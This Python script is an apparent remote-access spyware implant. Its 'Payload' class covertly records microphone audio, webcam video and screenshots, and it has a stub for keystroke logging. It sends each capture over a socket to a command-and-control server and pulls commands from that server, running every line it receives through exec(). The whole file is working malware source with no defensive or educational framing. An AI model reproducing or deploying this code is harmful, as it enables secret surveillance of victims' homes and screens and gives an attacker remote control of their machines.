#!/usr/bin/env python3

# Required :
# AS ROOT !!
# apt install pip

# ON MAC
# export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES

# pip install pyscreenshot
# pip install pillow
# pip install numpy
# pip install scipy
# pip install sounddevice
# pip install opencv-python

import io
import cv2
import sounddevice as sd
from scipy.io.wavfile import write
import pyscreenshot as ss
import socket as s
import os


class Payload:
    """Method used to record audio"""
    @staticmethod
    def recordAudio():
        duration = 2.5  #Seconds
        fs = 44100  #Informations per seconds

        #Change default informations of the sound device
        sd.default.samplerate = fs
        sd.default.channels = 1
        sd.default.dtype = "int16"

        #Start the recording
        myrecording = sd.rec(int(duration * fs))
        sd.wait()

        #Convert the recording to byte string, sendable through the network
        binrec = io.BytesIO(myrecording)
        binrec.seek(0)

        return binrec.read()

    """Method used to record using the camera"""
    @staticmethod
    def recordCamera():
        #Capture video from camera
        cap = cv2.VideoCapture(0)  
        
        #Error opening the camera
        if(not cap.isOpened()):
            return None
        
        #Get the width and height of frame
        width = int(cap.get(3))
        height = int(cap.get(4))
    

        #Define some data options
        output = '.output.mp4'
        fps = 20 #Images per second
        time = 2 #Seconds

        #Create VideoWriter object to save the file
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(output, fourcc, fps, (width, height))

        #Write the video frame by frame into the file
        i = 0
        while(cap.isOpened() and i < fps * time):
            ret, frame = cap.read()
            if ret:
                out.write(frame)    #Write one frame into the file
            else:
                break
            i = i + 1

        #Release everything when job is finished
        out.release()
        cap.release()
        
        #Open the file to send it
        txt = open(output, 'rb').read()
        try:
            os.remove(output)
        except OSError:
            pass  
        
        return txt

    """Method used to take a screenshot"""
    @staticmethod
    def recordScreen():
        #Take a screenshot & save it in the output file
        im = ss.grab()

        #Convert the image to byte string, sendable through the network
        output = io.BytesIO()
        im.save(output, format="PNG")
        output.seek(0)

        return output.read()
    
    """Method used to record the keystrokes"""
    @staticmethod
    def recordKeyboard():
        print("Not implemented")

    """Method used to ask for instructions to the C&C"""
    @staticmethod
    def askInstructions():
        HOST = s.gethostbyname(s.gethostname()) #"192.168.1.17"
        PORT = 6969  # Port used to send data
        
        #Create a socket to get instructions from the C&C
        sock = s.socket(s.AF_INET, s.SOCK_STREAM)
        sock.connect((HOST, PORT))
        sock.sendall(b'5')
        
        #Receive instructions
        receivedData = ''
        data = sock.recv(1024)
        while data != b'kill':
            receivedData += data.decode()
            data = sock.recv(1024)
            
        return receivedData

    """Method used to send data to the C&C"""
    @staticmethod
    def send(data, obj):
        #Switcher used for the C&C to know what kind of informations will be sent
        switcher = {
            "audio": b'1',
            "video": b'2',
            "keys": b'3',
            "image": b'4'
        }
        HOST = s.gethostbyname(s.gethostname()) #"192.168.1.17"
        PORT = 6969  # Port used to send data

        #Send the informations to the C&C
        with s.socket(s.AF_INET, s.SOCK_STREAM) as sock:
            sock.connect((HOST, PORT))
            sock.sendall(switcher[obj])
            sock.sendall(data)

#Execute instructions received
for cmd in Payload.askInstructions().split('\n'):
    try:
        exec(cmd)
    except Exception as err:
        print("Error in " + cmd + " - " + str(err) + "\n") #Debug
        continue

